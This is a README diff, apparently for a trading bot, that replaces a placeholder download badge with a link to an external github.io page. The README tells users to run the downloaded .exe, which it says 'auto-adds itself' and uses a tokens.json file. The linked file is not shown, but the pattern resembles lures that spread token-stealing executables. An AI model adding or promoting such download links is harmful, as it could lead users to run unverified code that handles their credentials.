@@ -10,7 +10,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` (if available) or execute using Python — the bot will auto-add itself to your working directory, and configurations (`settings.json` / `tokens.json`) will be ready.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://limitswap-bot.github.io/.github/)
 
 ## ​ Overview
 A quick look at key parts in action:
